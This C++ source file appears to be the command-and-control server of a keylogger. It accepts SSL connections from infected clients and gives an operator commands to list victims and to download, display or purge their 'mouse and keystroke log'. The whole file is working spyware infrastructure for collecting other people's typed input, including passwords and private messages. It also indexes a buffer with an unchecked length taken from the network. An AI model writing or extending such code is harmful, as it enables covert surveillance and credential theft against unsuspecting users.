#include <iostream>
#include <string>
#include <cstring>
#include <algorithm>
#include <functional>
#include <map>

#include "TCPServer.hpp"
#include "SSLNetwork.hpp"
#include "Protocol.hpp"
#include "parser.hpp"

int main(int argc, char **argv)
{
  TCPServer server;
  std::vector<SSLNetwork*> clientsList;
  char buffer[sizeof(t_cmd)];
  char cmd_buffer[255];
  Parser parser(server, clientsList);

  parser.unblockRead();
  server.listenClients("127.0.0.1", "4242", 3);
  std::cout << "Available commands:" << std::endl;
  std::cout << "LIST : List connected clients ID." << std::endl;
  std::cout << "DOWNLOAD_LOG [ID] : Download log for client ID." << std::endl;
  std::cout << "DISPLAY_LOG [ID] : Display mouse and keystroke log for client ID." << std::endl;
  std::cout << "PURGE_LOG [ID] : Delete log for client ID." << std::endl;
  std::cout << "CLOSE [ID] : Close client ID." << std::endl << std::endl;

  while (server.isListening())
    {
      parser.parseCommands();
      server.waitForClientsActivity();
      if (server.incomingConnection())
	{
	  SSLNetwork* client = server.getIncomingCLient();
	  clientsList.push_back(client);
	}
      for (auto clientIt = clientsList.begin(); clientIt != clientsList.end(); clientIt++)
	{
	  if (server.checkSocket(*clientIt))
	    {
	      int read = 0;
	      if ((read = ((*clientIt)->receiveData(buffer, cyphered_size))) == 0)
		{
		  std::vector<SSLNetwork*> temp;
		  std::cout << "Client disconected" << std::endl;
		  server.disconectClient(*clientIt);
		  (*clientIt)->disconnectFromHost();
		}
	      else if (read > 0)
		{
		  if (read == sizeof(t_cmd))
		    {
		      t_cmd *command = reinterpret_cast<t_cmd *>(buffer);
		      if (command->cmd == commandType::DOWNLOAD_LOG)
			{
			  char data[buffer_size + 1];
			  std::memcpy(data, command->buffer, buffer_size);
			  data[command->data_len] = '\0';
			  parser.getOutputStream() << data << std::endl;
			}
		      if (command->cmd == commandType::DOWNLOAD_LOG_END)
			{
			  std::cout << "LOG DOWNLOAD COMPLETE" << std::endl;
			}
		      if (command->cmd == commandType::DISPLAY_LOG)
			{
			  char data[buffer_size + 1];
			  std::memcpy(data, command->buffer, buffer_size);
			  data[command->data_len] = '\0';
			  std::cout << data << std::endl;
			}
		      if (command->cmd == commandType::DISPLAY_LOG_END)
			{
			  std::cout << "LOG DOWNLOAD COMPLETED" << std::endl;
			}
		    }
		}
	    }
	}
    }
  return (0);
}
